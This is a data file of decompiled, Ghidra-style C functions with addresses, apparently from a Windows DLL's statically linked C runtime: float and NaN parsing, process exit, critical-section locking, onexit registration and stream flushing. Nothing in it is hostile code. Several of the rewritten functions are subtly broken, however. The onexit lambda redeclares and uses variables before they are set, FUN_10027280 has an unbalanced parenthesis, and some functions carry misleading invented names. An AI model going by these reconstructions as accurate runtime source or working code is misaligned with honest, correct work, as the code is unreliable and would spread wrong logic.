{"Function Name": "common_atof_l<>", "Address": "10024b38", "Source Code": "\\*\nfloat10 __cdecl common_atof_l<>(int input_param,__acrt_ptd **thread_data)\n{\n    float10 result_float = 0.0; \n    if (input_param == 0) { \n        undefined4 *error_pointer = (undefined4 *)FUN_100253b8(); \n        *error_pointer = 0x16; \n        FUN_1001de96(); \n    } else {\n        int local_integer; \n        double local_double = 0.0; \n        make_c_string_character_source<>((undefined4 *)&stack0xffffffd4, input_param, (undefined4 *)0x0); \n        parse_floating_point<>(&local_1c, extraout_ECX, extraout_ECX, &local_double); \n        result_float = (float10)local_double; \n        if (condition_check != '\\0') { \n            *(uint *)(local_integer + 0x350) &= 0xfffffffd; \n        }\n    }\n    return result_float; \n}\n*\\ \n \nfloat10 __cdecl common_atof_l<>(int input_param,__acrt_ptd **thread_data)\n{\n    float10 result_float = 0.0;\n    if (input_param == 0) {\n        undefined4 *error_pointer = (undefined4 *)FUN_100253b8();\n        *error_pointer = 0x16;\n        FUN_1001de96();\n    } else {\n        int local_integer;\n        double local_double = 0.0;\n        make_c_string_character_source<>((undefined4 *)&stack0xffffffd4, input_param, (undefined4 *)0x0);\n        parse_floating_point<>(&local_1c, extraout_ECX, extraout_ECX, &local_double);\n        result_float = (float10)local_double;\n        if (condition_check != '\\0') {\n            *(uint *)(local_integer + 0x350) &= 0xfffffffd;\n        }\n    }\n    return result_float;\n}"}
{"Function Name": "__crt_strtox::parse_floating_point_possible_nan<char,class___crt_strtox::c_string_character_source<char>,char_const*>", "Address": "10025090", "Source Code": "\\*\nfloating_point_parse_result __cdecl\n__crt_strtox::\nparse_floating_point_possible_nan<char,class___crt_strtox::c_string_character_source<char>,char_const*>\n(char *param_1, c_string_character_source<char> *param_2, char *param_3)\n{\n    char cVar1; \n    bool bVar2; \n    floating_point_parse_result fVar3; \n    int iVar4; \n    iVar4 = 0; \n    do {\n        \n        if ((*param_1 != (&DAT_1003ec60)[iVar4]) && (*param_1 != (&DAT_1003ec64)[iVar4])) {\n            \n            <lambda_952f81e62542d0a726c252b8c2136a43>::operator()\n            ((<lambda_952f81e62542d0a726c252b8c2136a43> *)&param_2);\n            return 7; \n        }\n        \n        cVar1 = **(char **)param_2; \n        iVar4 = iVar4 + 1; \n        *(char **)param_2 = *(char **)param_2 + 1; \n        *param_1 = cVar1; \n    } while (iVar4 != 3); \n    c_string_character_source<char>::unget(param_2, cVar1); \n    param_3 = *(char **)param_2; \n    cVar1 = *param_3; \n    *(char **)param_2 = param_3 + 1; \n    *param_1 = cVar1; \n    if (cVar1 == '(') { \n        cVar1 = **(char **)param_2; \n        *(char **)param_2 = *(char **)param_2 + 1; \n        *param_1 = cVar1; \n        \n        bVar2 = parse_floating_point_possible_nan_is_snan<char,class___crt_strtox::c_string_character_source<char>_>\n        (param_1, param_2);\n        \n        if (bVar2) { \n            fVar3 = 5; \n        } else {\n            \n            bVar2 = parse_floating_point_possible_nan_is_ind<char,class___crt_strtox::c_string_character_source<char>_>\n            (param_1, param_2);\n            \n            if (!bVar2) { \n                if (*param_1 != ')') { \n                    do {\n                        if (*param_1 == '\\0') break; \n                        iVar4 = (int)*param_1; \n                        \n                        \n                        if ((((9 < iVar4 - 0x30U) && (0x19 < iVar4 - 0x61U)) && (0x19 < iVar4 - 0x41U)) &&\n                        (iVar4 != 0x5f)) goto LAB_1002518a; \n                        cVar1 = **(char **)param_2; \n                        *(char **)param_2 = *(char **)param_2 + 1; \n                        *param_1 = cVar1; \n                    } while (cVar1 != ')'); \n                    if (*param_1 != ')') { \nLAB_1002518a:\n                        bVar2 = <lambda_952f81e62542d0a726c252b8c2136a43>::operator()\n                        ((<lambda_952f81e62542d0a726c252b8c2136a43> *)&param_2);\n                        return (-(uint)bVar2 & 0xfffffffd) + 7; \n                    }\n                }\n                return 4; \n            }\n            fVar3 = 6; \n        }\n        c_string_character_source<char>::unget(param_2, *param_1); \n    } else {\n        \n        bVar2 = <lambda_952f81e62542d0a726c252b8c2136a43>::operator()\n        ((<lambda_952f81e62542d0a726c252b8c2136a43> *)&param_2);\n        fVar3 = (-(uint)bVar2 & 0xfffffffd) + 7; \n    }\n    return fVar3; \n}\n*\\ \n \nfloating_point_parse_result __cdecl\n__crt_strtox::\nparse_floating_point_possible_nan<char,class___crt_strtox::c_string_character_source<char>,char_const*>\n(char *param_1,c_string_character_source<char> *param_2,char *param_3)\n{\nchar cVar1;\nbool bVar2;\nfloating_point_parse_result fVar3;\nint iVar4;\niVar4 = 0;\ndo {\nif ((*param_1 != (&DAT_1003ec60)[iVar4]) && (*param_1 != (&DAT_1003ec64)[iVar4])) {\n<lambda_952f81e62542d0a726c252b8c2136a43>::operator()\n((<lambda_952f81e62542d0a726c252b8c2136a43> *)&param_2);\nreturn 7;\n}\ncVar1 = **(char **)param_2;\niVar4 = iVar4 + 1;\n*(char **)param_2 = *(char **)param_2 + 1;\n*param_1 = cVar1;\n} while (iVar4 != 3);\nc_string_character_source<char>::unget(param_2,cVar1);\nparam_3 = *(char **)param_2;\ncVar1 = *param_3;\n*(char **)param_2 = param_3 + 1;\n*param_1 = cVar1;\nif (cVar1 == '(') {\ncVar1 = **(char **)param_2;\n*(char **)param_2 = *(char **)param_2 + 1;\n*param_1 = cVar1;\nbVar2 = parse_floating_point_possible_nan_is_snan<char,class___crt_strtox::c_string_character_source<char>_>\n(param_1,param_2);\nif (bVar2) {\nfVar3 = 5;\n}\nelse {\nbVar2 = parse_floating_point_possible_nan_is_ind<char,class___crt_strtox::c_string_character_source<char>_>\n(param_1,param_2);\nif (!bVar2) {\nif (*param_1 != ')') {\ndo {\nif (*param_1 == '\\0') break;\niVar4 = (int)*param_1;\nif ((((9 < iVar4 - 0x30U) && (0x19 < iVar4 - 0x61U)) && (0x19 < iVar4 - 0x41U)) &&\n(iVar4 != 0x5f)) goto LAB_1002518a;\ncVar1 = **(char **)param_2;\n*(char **)param_2 = *(char **)param_2 + 1;\n*param_1 = cVar1;\n} while (cVar1 != ')');\nif (*param_1 != ')') {\nLAB_1002518a:\nbVar2 = <lambda_952f81e62542d0a726c252b8c2136a43>::operator()\n((<lambda_952f81e62542d0a726c252b8c2136a43> *)&param_2);\nreturn (-(uint)bVar2 & 0xfffffffd) + 7;\n}\n}\nreturn 4;\n}\nfVar3 = 6;\n}\nc_string_character_source<char>::unget(param_2,*param_1);\n}\nelse {\nbVar2 = <lambda_952f81e62542d0a726c252b8c2136a43>::operator()\n((<lambda_952f81e62542d0a726c252b8c2136a43> *)&param_2);\nfVar3 = (-(uint)bVar2 & 0xfffffffd) + 7;\n}\nreturn fVar3;\n}"}
{"Function Name": "__crt_strtox::parse_floating_point_possible_nan_is_ind<char,class___crt_strtox::c_string_character_source<char>_>", "Address": "100251ab", "Source Code": "bool __cdecl\n__crt_strtox::\nparse_floating_point_possible_nan_is_ind<char,class___crt_strtox::c_string_character_source<char>_>\n(char *param_1, c_string_character_source<char> *param_2)\n{\n    int iVar2 = 0; \n    \n    while ((*param_1 == (&DAT_1003ec78)[iVar2] || (*param_1 == (&DAT_1003ec7c)[iVar2]))) {\n        *param_1 = **(char **)param_2; \n        iVar2++; \n        *(char **)param_2 = *(char **)param_2 + 1; \n        if (iVar2 == 4) { \n            return true; \n        }\n    }\n    return false; \n}"}
{"Function Name": "__crt_strtox::parse_floating_point_possible_nan_is_snan<char,class___crt_strtox::c_string_character_source<char>_>", "Address": "100251e7", "Source Code": "bool __cdecl\n__crt_strtox::\nparse_floating_point_possible_nan_is_snan<char,class___crt_strtox::c_string_character_source<char>_>\n(char *param_1, c_string_character_source<char> *param_2)\n{\n    int iVar2 = 0; \n    \n    while ((*param_1 == (&DAT_1003ec68)[iVar2] || (*param_1 == \"snan\"[iVar2]))) {\n        *param_1 = **(char **)param_2; \n        *(char **)param_2 = *(char **)param_2 + 1; \n        iVar2++; \n        if (iVar2 == 5) { \n            return true; \n        }\n    }\n    return false; \n}"}
{"Function Name": "<lambda_952f81e62542d0a726c252b8c2136a43>::operator()", "Address": "10025223", "Source Code": "bool __thiscall\n<lambda_952f81e62542d0a726c252b8c2136a43>::operator()\n(<lambda_952f81e62542d0a726c252b8c2136a43> *this)\n{\n    \n    __crt_strtox::c_string_character_source<char>::unget(*(c_string_character_source<char> **)this, **(char **)(this + 4));\n    \n    \n    **(undefined **)(this + 4) = 0;\n    \n    \n    **(undefined4 **)this = **(undefined4 **)(this + 8);\n    \n    \n    return true;\n}"}
{"Function Name": "FUN_100253a5", "Address": "100253a5", "Source Code": "__acrt_ptd * getPointerToAcptd(void) \n{\n    __acrt_ptd *acptdPtr = retrieveAcptd(); \n    return (acptdPtr == (__acrt_ptd *)0x0) ? \n           (__acrt_ptd *)&defaultAcptd : \n           acptdPtr + 0x14; \n}"}
{"Function Name": "FUN_100253b8", "Address": "100253b8", "Source Code": "__acrt_ptd * get_acrt_ptd(void) \n{\n    __acrt_ptd *acrt_ptd_pointer = FUN_10029372(); \n    return (acrt_ptd_pointer == (__acrt_ptd *)0x0) ? \n           (__acrt_ptd *)&default_acrt_ptd : \n           acrt_ptd_pointer + 0x10; \n}"}
{"Function Name": "__crt_state_management::dual_state_global<char**>::initialize", "Address": "1002551c", "Source Code": "void __thiscall\n__crt_state_management::dual_state_global<char**>::initialize\n(dual_state_global<char**> *this,char **param_1)\n{\n    \n    uint uVar1 = ~-(uint)(this + 4 < this) & (uint)(this + 4 + (3 - (int)this)) >> 2;\n    \n    if (uVar1 != 0) {\n        \n        for (uint uVar2 = 0; uVar2 < uVar1; uVar2++) {\n            \n            *(char ***)this = param_1;\n            \n            this = (dual_state_global<char**> *)((int)this + 4);\n        }\n    }\n}"}
{"Function Name": "__query_new_handler", "Address": "100255a5", "Source Code": "uint __query_new_handler(void)\n{\n    uint result; \n    ___acrt_lock(0); \n    result = globalVar1 ^ globalVar2; \n    \n    return result >> (globalVar1 & 0x1f) | result << (0x20 - (globalVar1 & 0x1f));\n}"}
{"Function Name": "FUN_100255ee", "Address": "100255ee", "Source Code": "void unlock_function(void) \n{\n    acrt_unlock(0); \n}"}
{"Function Name": "FUN_100257c1", "Address": "100257c1", "Source Code": "void unlockResourceFunction(void) \n{\n    \n    unlockPointer(**(int **)(*(int *)0x10)); \n}"}
{"Function Name": "FUN_100257f5", "Address": "100257f5", "Source Code": "void __fastcall FUN_100257f5(int **input_pointer)\n{\n    uint intermediate_result; \n    undefined status_code; \n    \n    if (DAT_1004fddc != '\\0') goto LAB_100258b2; \n    LOCK(); \n    DAT_1004fdd4 = 1; \n    UNLOCK(); \n    \n    if (**input_pointer == 0) {\n        byte lower_bits = (byte)DAT_1004e008 & 0x1f; \n        byte complement_bits = 0x20 - lower_bits & 0x1f; \n        \n        if (DAT_1004fdd8 != ((0U >> complement_bits | 0 << 0x20 - complement_bits) ^ DAT_1004e008)) {\n            intermediate_result = DAT_1004e008 ^ DAT_1004fdd8; \n            (*(code *)PTR__guard_check_icall_1003a2f8)(0, 0, 0); \n            (*(code *)(intermediate_result >> lower_bits | intermediate_result << 0x20 - lower_bits))(); \n        }\n        status_code = 0xf8; \n        goto LAB_10025869; \n    } else if (**input_pointer == 1) {\n        status_code = 4; \n        goto LAB_10025869; \n    }\n    \n    if (**input_pointer == 0) {\n        __initterm((undefined **)&DAT_1003a358, (undefined **)&DAT_1003a368); \n    }\n    __initterm((undefined **)&DAT_1003a36c, (undefined **)&DAT_1003a370); \n    \n    if (*input_pointer[1] == 0) {\n        DAT_1004fddc = '\\x01'; \n        *(undefined *)input_pointer[2] = 1; \n    }\nLAB_100258b2: \n    FUN_100373d9(); \n    return; \n}"}
{"Function Name": "FUN_100258e4", "Address": "100258e4", "Source Code": "void __cdecl FUN_100258e4(uint exitCode, undefined4 exitStatus, int isManagedAppCheck)\n{\n    code *functionPointer; \n    uint isManagedApp;   \n    \n    if (isManagedAppCheck == 0) {\n        isManagedApp = ___scrt_is_managed_app(); \n        \n        if ((char)isManagedApp != '\\0') {\n            try_cor_exit_process(exitCode); \n        }\n    }\n    \n    __acrt_lock_and_call<>(2, &exitStatus);\n    \n    if (isManagedAppCheck != 0) {\n        return;\n    }\n    \n    exit_or_terminate_process(exitCode);\n    \n    \n    functionPointer = (code *)swi(3);\n    (*functionPointer)(); \n    return; \n}"}
{"Function Name": "exit_or_terminate_process", "Address": "1002593a", "Source Code": "void __cdecl exit_or_terminate_process(uint exitCode)\n{\n    \n    \n    if (FUN_1002bf66() != 1 && (*(uint *)((int)processEnvBlock + 0x68) >> 8 & 1) == 0) {\n        \n        TerminateProcess(GetCurrentProcess(), exitCode);\n    }\n    \n    try_cor_exit_process(exitCode);\n    \n    ExitProcess(exitCode);\n}"}
{"Function Name": "__exit", "Address": "10025a48", "Source Code": "void __cdecl __exit(int exitCode)\n{\n    \n    FUN_100258e4(exitCode, 2, 0);\n}"}
{"Function Name": "FUN_10025a5e", "Address": "10025a5e", "Source Code": "undefined4 getUndefinedValue(void) \n{\n    return globalValue; \n}"}
{"Function Name": "common_initialize_environment_nolock<char>", "Address": "10025d6f", "Source Code": "\\*\nint __cdecl common_initialize_environment_nolock<char>(void)\n{\n    LPSTR _Memory; \n    if (DAT_1004fee8 != 0) { \n        return 0; \n    }\n    FUN_1002c980(); \n    _Memory = ___dcrt_get_narrow_environment_from_os(); \n    if (_Memory == (LPSTR)0x0) { \n        return -1; \n    }\n    char **ppcVar1 = create_environment<char>(_Memory); \n    if (ppcVar1 == (char **)0x0) { \n        FID_conflict__free(_Memory); \n        return -1; \n    }\n    DAT_1004fef4 = ppcVar1; \n    __crt_state_management::dual_state_global<char**>::initialize \n    ((dual_state_global<char**> *)&DAT_1004fee8, ppcVar1); \n    FID_conflict__free(_Memory); \n    return 0; \n}\n*\\ \n \nint __cdecl common_initialize_environment_nolock<char>(void)\n{\n    LPSTR _Memory;\n    if (DAT_1004fee8 != 0) {\n        return 0;\n    }\n    FUN_1002c980();\n    _Memory = ___dcrt_get_narrow_environment_from_os();\n    if (_Memory == (LPSTR)0x0) {\n        return -1;\n    }\n    char **ppcVar1 = create_environment<char>(_Memory);\n    if (ppcVar1 == (char **)0x0) {\n        FID_conflict__free(_Memory);\n        return -1;\n    }\n    DAT_1004fef4 = ppcVar1;\n    __crt_state_management::dual_state_global<char**>::initialize\n    ((dual_state_global<char**> *)&DAT_1004fee8, ppcVar1);\n    FID_conflict__free(_Memory);\n    return 0;\n}"}
{"Function Name": "common_initialize_environment_nolock<char>", "Address": "10025f75", "Source Code": "\\*\nint __cdecl common_initialize_environment_nolock<char>(void)\n{\n    LPSTR environmentMemory; \n    if (isEnvironmentInitialized != 0) { \n        return 0; \n    }\n    FUN_1002c980(); \n    environmentMemory = ___dcrt_get_narrow_environment_from_os(); \n    if (environmentMemory == (LPSTR)0x0) { \n        return -1; \n    }\n    char **environmentPointer = create_environment<char>(environmentMemory); \n    if (environmentPointer == (char **)0x0) { \n        FID_conflict__free(environmentMemory); \n        return -1; \n    }\n    createdEnvironmentPointer = environmentPointer; \n    \n    __crt_state_management::dual_state_global<char**>::initialize((dual_state_global<char**> *)&isEnvironmentInitialized, environmentPointer);\n    FID_conflict__free(environmentMemory); \n    return 0; \n}\n*\\ \n \nint __cdecl common_initialize_environment_nolock<char>(void)\n{\n    LPSTR environmentMemory;\n    if (isEnvironmentInitialized != 0) {\n        return 0;\n    }\n    FUN_1002c980();\n    environmentMemory = ___dcrt_get_narrow_environment_from_os();\n    if (environmentMemory == (LPSTR)0x0) {\n        return -1;\n    }\n    char **environmentPointer = create_environment<char>(environmentMemory);\n    if (environmentPointer == (char **)0x0) {\n        FID_conflict__free(environmentMemory);\n        return -1;\n    }\n    createdEnvironmentPointer = environmentPointer;\n    __crt_state_management::dual_state_global<char**>::initialize((dual_state_global<char**> *)&isEnvironmentInitialized, environmentPointer);\n    FID_conflict__free(environmentMemory);\n    return 0;\n}"}
{"Function Name": "FUN_10025fbf", "Address": "10025fbf", "Source Code": "void unlock_function(void) \n{\n    \n    \n    \n    ___acrt_unlock(**(int **)(*(int *)0x10));\n}"}
{"Function Name": "__crt_seh_guarded_call<int>::operator()<class_<lambda_800076c951b434888f4765a74a194fcc>,class_<lambda_4e60a939b0d047cfe11ddc22648dfba9>&,class_<lambda_6dbb1268764f43b569ce7b67e331d33a>_>", "Address": "10025fcb", "Source Code": "\\*\nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_800076c951b434888f4765a74a194fcc>,class_<lambda_4e60a939b0d047cfe11ddc22648dfba9>&,class_<lambda_6dbb1268764f43b569ce7b67e331d33a>_>\n(__crt_seh_guarded_call<int> *this, \n<lambda_800076c951b434888f4765a74a194fcc> *param_1, \n<lambda_4e60a939b0d047cfe11ddc22648dfba9> *param_2, \n<lambda_6dbb1268764f43b569ce7b67e331d33a> *param_3) \n{\n    \n    ___acrt_lock(*(int *)param_1);\n    \n    return <lambda_4e60a939b0d047cfe11ddc22648dfba9>::operator()(param_2);\n}\n*\\ \n \nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_800076c951b434888f4765a74a194fcc>,class_<lambda_4e60a939b0d047cfe11ddc22648dfba9>&,class_<lambda_6dbb1268764f43b569ce7b67e331d33a>_>\n(__crt_seh_guarded_call<int> *this,<lambda_800076c951b434888f4765a74a194fcc> *param_1,\n<lambda_4e60a939b0d047cfe11ddc22648dfba9> *param_2,\n<lambda_6dbb1268764f43b569ce7b67e331d33a> *param_3)\n{\n    ___acrt_lock(*(int *)param_1);\n    return <lambda_4e60a939b0d047cfe11ddc22648dfba9>::operator()(param_2);\n}"}
{"Function Name": "FUN_10026010", "Address": "10026010", "Source Code": "void unlock_function(void) \n{\n    \n    \n    \n    \n    unlock_function_call(**(int **)(*(int *)0x10));\n}"}
{"Function Name": "<lambda_4e60a939b0d047cfe11ddc22648dfba9>::operator()", "Address": "1002608b", "Source Code": "int __thiscall\n<lambda_4e60a939b0d047cfe11ddc22648dfba9>::operator()\n(<lambda_4e60a939b0d047cfe11ddc22648dfba9> *this)\n{\n    \n    uint *puVar5 = **(uint ***)this;\n    \n    if (puVar5 == (uint *)0x0) {\n        return -1; \n    }\n    \n    byte bVar4 = (byte)DAT_1004e008 & 0x1f;\n    \n    uint *puVar9 = (uint *)((puVar5[1] ^ DAT_1004e008) >> bVar4 | (puVar5[1] ^ DAT_1004e008) << (0x20 - bVar4));\n    \n    \n    uint *puVar7 = (uint *)((puVar5[2] ^ DAT_1004e008) >> bVar4 | (puVar5[2] ^ DAT_1004e008) << (0x20 - bVar4));\n    \n    \n    LPCVOID pvVar1 = (LPCVOID)((*puVar5 ^ DAT_1004e008) >> bVar4 | (*puVar5 ^ DAT_1004e008) << (0x20 - bVar4));\n    \n    if (puVar9 != puVar7) {\n        \n        uint uVar8 = (int)puVar7 - (int)pvVar1 >> 2;\n        \n        uint uVar2 = (uVar8 < 0x201) ? uVar8 : 0x200;\n        \n        uVar2 += uVar8;\n        if (uVar2 == 0) {\n            uVar2 = 0x20; \n        }\n        if (uVar2 < uVar8) {\n            uVar2 = uVar8 + 4; \n        }\n        \n        pvVar1 = __recalloc_base(pvVar1, uVar2, 4);\n        FID_conflict__free((void *)0x0); \n        \n        if (pvVar1 == (LPVOID)0x0) {\n            return -1; \n        }\n    } else {\n        \n        pvVar1 = __recalloc_base(pvVar1, uVar2, 4);\n        FID_conflict__free((void *)0x0); \n        \n        if (pvVar1 == (LPVOID)0x0) {\n            uVar2 = uVar8 + 4; \n            pvVar1 = __recalloc_base(pvVar1, uVar2, 4);\n            FID_conflict__free((void *)0x0); \n            \n            if (pvVar1 == (LPVOID)0x0) {\n                return -1; \n            }\n        }\n    }\n    \n    uint *puVar5_next = (uint *)((int)pvVar1 + uVar8 * 4);\n    uint *puVar7_next = (uint *)((int)pvVar1 + uVar2 * 4);\n    \n    bVar4 = 0x20 - ((byte)DAT_1004e008 & 0x1f) & 0x1f;\n    \n    uint uVar2 = (0U >> bVar4 | 0 << (0x20 - bVar4)) ^ DAT_1004e008;\n    \n    uint uVar8 = ~-(uint)(puVar7_next < puVar5_next) & (uint)((int)puVar7_next + (3 - (int)puVar5_next)) >> 2;\n    \n    if (uVar8 != 0) {\n        for (uint uVar3 = 0; uVar3 < uVar8; uVar3++) {\n            *puVar5_next++ = uVar2; \n        }\n    }\n    \n    uVar2 = __crt_fast_encode_pointer<>(**(uint **)(this + 4));\n    *puVar5_next = uVar2;\n    \n    uVar2 = __crt_fast_encode_pointer<>((uint)pvVar1);\n    ***(uint ***)this = uVar2;\n    \n    uVar2 = __crt_fast_encode_pointer<>((uint)(puVar5_next + 1));\n    *(uint *)(**(int **)this + 4) = uVar2;\n    \n    uVar2 = __crt_fast_encode_pointer<>((uint)puVar7_next);\n    *(uint *)(**(int **)this + 8) = uVar2;\n    return 0; \n}"}
{"Function Name": "__register_onexit_function", "Address": "1002635a", "Source Code": "void __register_onexit_function(undefined exit_param_1, undefined exit_param_2)\n{\n    \n    __acrt_lock_and_call<class_<lambda_4e60a939b0d047cfe11ddc22648dfba9>_>\n    (2, (<lambda_4e60a939b0d047cfe11ddc22648dfba9> *)&exit_param_1);\n    \n    \n    return;\n}"}
{"Function Name": "<lambda_af42a3ee9806e9a7305d451646e05244>::operator()", "Address": "1002645c", "Source Code": "void __thiscall\n<lambda_af42a3ee9806e9a7305d451646e05244>::operator()\n(<lambda_af42a3ee9806e9a7305d451646e05244> *this,__crt_multibyte_data **param_1)\n{\n    LOCK(); \n    if (--*(int *)*param_1 == 0 && *param_1 != (__crt_multibyte_data *)&DAT_1004e5e8) { \n        FID_conflict__free(*param_1); \n        *param_1 = (__crt_multibyte_data *)&DAT_1004e5e8; \n    }\n    UNLOCK(); \n}"}
{"Function Name": "FUN_1002649c", "Address": "1002649c", "Source Code": "bool isFunctionSuccessful(void) \n{\n    \n    return getPointerValue() != (__acrt_ptd *)0x0; \n}"}
{"Function Name": "FUN_100264a7", "Address": "100264a7", "Source Code": "undefined cleanup_function(void) \n{\n    free_resources(); \n    return 1; \n}"}
{"Function Name": "___acrt_lock", "Address": "100265b5", "Source Code": "void __cdecl ___acrt_lock(int critical_section_index)\n{\n    \n    \n    EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_1004ff10 + critical_section_index * 0x18));\n}"}
{"Function Name": "FUN_100265cc", "Address": "100265cc", "Source Code": "undefined4 FUN_100265cc(void) \n{\n    LPCRITICAL_SECTION criticalSectionPtr; \n    int currentCount; \n    if (criticalSectionCount != 0) { \n        criticalSectionPtr = (LPCRITICAL_SECTION)(&criticalSectionArray + criticalSectionCount * 0x18); \n        currentCount = criticalSectionCount; \n        do { \n            DeleteCriticalSection(criticalSectionPtr); \n            criticalSectionCount--; \n            criticalSectionPtr--; \n            currentCount--; \n        } while (currentCount != 0); \n    }\n    return 1; \n}"}
{"Function Name": "___acrt_unlock", "Address": "100265fd", "Source Code": "void __cdecl ___acrt_unlock(int critical_section_index)\n{\n    \n    LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_1004ff10 + critical_section_index * 0x18));\n}"}
{"Function Name": "__lock_locales", "Address": "10026614", "Source Code": "void lockLocalSettings(void)\n{\n    \n    lockLocaleSettings(4);\n}"}
{"Function Name": "FUN_1002666b", "Address": "1002666b", "Source Code": "void unlockResourceFunction(void) \n{\n    \n    \n    \n    unlockResource(**(int **)(*(int *)0x10));\n}"}
{"Function Name": "FUN_1002699d", "Address": "1002699d", "Source Code": "uint __cdecl FUN_1002699d(int input_value)\n{\n    \n    if (global_check != 0) {\n        \n        return check_digit(input_value, (_locale_t)0x0);\n    }\n    \n    \n    return *(ushort *)(data_pointer + input_value * 2) & 4;\n}"}
{"Function Name": "FUN_100269ca", "Address": "100269ca", "Source Code": "uint __cdecl FUN_100269ca(int input_value)\n{\n    \n    if (global_check != 0) {\n        \n        return check_lowercase(input_value, (_locale_t)0x0);\n    }\n    \n    \n    return *(ushort *)(data_pointer + input_value * 2) & 2;\n}"}
{"Function Name": "FUN_100269f7", "Address": "100269f7", "Source Code": "uint __cdecl FUN_100269f7(int input_value)\n{\n    \n    if (global_check_variable != 0) {\n        \n        return check_uppercase(input_value, (_locale_t)0x0);\n    }\n    \n    return *(ushort *)(memory_location + input_value * 2) & 1;\n}"}
{"Function Name": "___acrt_iob_func", "Address": "10026f62", "Source Code": "\\*\nundefined * __cdecl ___acrt_iob_func(int index)\n{\n    \n    \n    return (undefined *)((char *)&base_address + index * 0x38);\n}\n*\\ \n \nundefined * __cdecl ___acrt_iob_func(int index)\n{\n    return (undefined *)((char *)&base_address + index * 0x38);\n}"}
{"Function Name": "FUN_10027118", "Address": "10027118", "Source Code": "void FUN_10027118(void)\n{\n    \n    \n    unlock_file(*(FILE **)(base_pointer - 0x20));\n}"}
{"Function Name": "__crt_seh_guarded_call<void>::operator()<class_<lambda_2866be3712abc81a800a822484c830d8>,class_<lambda_39ca0ed439415581b5b15c265174cece>&,class_<lambda_2b24c74d71094a6cd0cb82e44167d71b>_>", "Address": "10027122", "Source Code": "\\*\nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_2866be3712abc81a800a822484c830d8>,class_<lambda_39ca0ed439415581b5b15c265174cece>&,class_<lambda_2b24c74d71094a6cd0cb82e44167d71b>_>\n(__crt_seh_guarded_call<void> *this,<lambda_2866be3712abc81a800a822484c830d8> *param_1,\n<lambda_39ca0ed439415581b5b15c265174cece> *param_2,\n<lambda_2b24c74d71094a6cd0cb82e44167d71b> *param_3)\n{\n    \n    __lock_file(*(FILE **)param_1);\n    \n    \n    \n    if (FUN_10027343(**(int **)param_2,*(int **)(param_2 + 4)) &&\n        (**(char **)(param_2 + 8) != '\\0' || ((*(uint *)(**(int **)param_2 + 0xc) >> 1 & 1) != 0))) {\n        \n        \n        if (__fflush_nolock(**(FILE ***)param_2) == -1) {\n            **(undefined4 **)(param_2 + 0xc) = 0xffffffff; \n        } else {\n            \n            **(int **)(param_2 + 4) += 1;\n        }\n    }\n    \n    \n    FUN_10027197();\n    \n    \n    return;\n}\n*\\ \n \nvoid __thiscall\n__crt_seh_guarded_call<void>::\noperator()<class_<lambda_2866be3712abc81a800a822484c830d8>,class_<lambda_39ca0ed439415581b5b15c265174cece>&,class_<lambda_2b24c74d71094a6cd0cb82e44167d71b>_>\n(__crt_seh_guarded_call<void> *this,<lambda_2866be3712abc81a800a822484c830d8> *param_1,\n<lambda_39ca0ed439415581b5b15c265174cece> *param_2,\n<lambda_2b24c74d71094a6cd0cb82e44167d71b> *param_3)\n{\n    __lock_file(*(FILE **)param_1);\n    if (FUN_10027343(**(int **)param_2,*(int **)(param_2 + 4)) &&\n        (**(char **)(param_2 + 8) != '\\0' || ((*(uint *)(**(int **)param_2 + 0xc) >> 1 & 1) != 0))) {\n        if (__fflush_nolock(**(FILE ***)param_2) == -1) {\n            **(undefined4 **)(param_2 + 0xc) = 0xffffffff;\n        } else {\n            **(int **)(param_2 + 4) += 1;\n        }\n    }\n    FUN_10027197();\n    return;\n}"}
{"Function Name": "FUN_10027197", "Address": "10027197", "Source Code": "void unlock_file_function(void) \n{\n    \n    unlock_file(**(FILE ***)(*(int *)0x10)); \n}"}
{"Function Name": "FUN_100271a3", "Address": "100271a3", "Source Code": "void FUN_100271a3(int *buffer_count, int **buffer_array)\n{\n    _iobuf **buffer_end; \n    _iobuf **buffer_iterator; \n    _iobuf *local_buffers[5]; \n    ___acrt_lock(*buffer_count); \n    buffer_end = DAT_10050068 + DAT_10050064; \n    for (buffer_iterator = DAT_10050068; buffer_iterator != buffer_end; buffer_iterator++) { \n        local_buffers[0] = *buffer_iterator; \n        if (FUN_10027343((int)local_buffers[0], *buffer_array) != 0) { \n            __acrt_lock_stream_and_call<class_<lambda_39ca0ed439415581b5b15c265174cece>_> \n            (local_buffers[0], (class_<lambda_39ca0ed439415581b5b15c265174cece> *)&local_buffers); \n        }\n    }\n    FUN_1002722a(); \n    return; \n}"}
{"Function Name": "FUN_1002722a", "Address": "1002722a", "Source Code": "void unlockResourceFunction(void) \n{\n    \n    unlockFunction(**(int **)(*(int *)0x10)); \n}"}
{"Function Name": "__crt_seh_guarded_call<int>::operator()<class_<lambda_6d20deecaf4856105ebacbad442d1079>,class_<lambda_9a32fed5bf61b6b509b2d3f6003082a1>&,class_<lambda_63ea2239ed67c638ddbae41947fdf875>_>", "Address": "10027236", "Source Code": "\\*\nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_6d20deecaf4856105ebacbad442d1079>,class_<lambda_9a32fed5bf61b6b509b2d3f6003082a1>&,class_<lambda_63ea2239ed67c638ddbae41947fdf875>_>\n(__crt_seh_guarded_call<int> *this,<lambda_6d20deecaf4856105ebacbad442d1079> *param_1,\n<lambda_9a32fed5bf61b6b509b2d3f6003082a1> *param_2,\n<lambda_63ea2239ed67c638ddbae41947fdf875> *param_3)\n{\n    \n    __lock_file(*(FILE **)param_1);\n    \n    \n    return __fflush_nolock(**(FILE ***)param_2);\n}\n*\\ \n \nint __thiscall\n__crt_seh_guarded_call<int>::\noperator()<class_<lambda_6d20deecaf4856105ebacbad442d1079>,class_<lambda_9a32fed5bf61b6b509b2d3f6003082a1>&,class_<lambda_63ea2239ed67c638ddbae41947fdf875>_>\n(__crt_seh_guarded_call<int> *this,<lambda_6d20deecaf4856105ebacbad442d1079> *param_1,\n<lambda_9a32fed5bf61b6b509b2d3f6003082a1> *param_2,\n<lambda_63ea2239ed67c638ddbae41947fdf875> *param_3)\n{\n    __lock_file(*(FILE **)param_1);\n    return __fflush_nolock(**(FILE ***)param_2);\n}"}
{"Function Name": "FUN_10027280", "Address": "10027280", "Source Code": "void unlockFileFunction(void) \n{\n    \n    unlockFile(**(FILE ***)(*(int *)0x10))); \n}"}
